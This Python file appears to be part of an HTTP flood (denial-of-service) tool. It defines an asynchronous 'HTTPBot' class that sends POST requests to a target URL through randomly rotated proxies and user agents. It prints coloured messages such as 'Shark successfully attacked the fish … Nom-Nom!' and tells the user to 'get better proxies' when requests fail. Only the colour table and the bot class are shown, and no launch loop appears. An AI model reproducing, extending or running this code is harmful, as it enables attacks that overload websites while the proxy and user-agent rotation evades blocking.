import aiohttp  
import random
import asyncio
from pystyle import Colorate, Colors

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

class HTTPBot:
    def __init__(self, proxies, user_agents):
        self.proxies = proxies
        self.user_agents = user_agents

    def get_random_proxy(self):
        return random.choice(self.proxies)

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    async def send_request(self, session, url, payload=None):
        proxy = self.get_random_proxy()
        user_agent = self.get_random_user_agent()
        proxy_url = f"{proxy['protocol']}://{proxy['host']}:{proxy['port']}"

        try:
            async with session.post(url, data=payload, headers={"User-Agent": user_agent}, proxy=proxy_url) as response:
                if response.status < 500:
                    sentsuccess = f"🦈 Shark successfully attacked the fish: {url} frоm: {proxy['host']}:{proxy['port']} Nom-Nom!"
                    print(Colorate.Horizontal(Colors.blue_to_white, (sentsuccess)))
                else:
                    sentfalse = f"🐟 Oh No! The fish: {url} escaped from: {proxy['host']}:{proxy['port']} Get better proxies!"
                    print(Colorate.Horizontal(Colors.blue_to_white, (sentfalse)))
        except Exception as e:
            sentfalse = f"🐟 Oh No! The fish: {url} escaped from: {proxy['host']}:{proxy['port']} Get better proxies!"
            print(Colorate.Horizontal(Colors.blue_to_white, (sentfalse)))
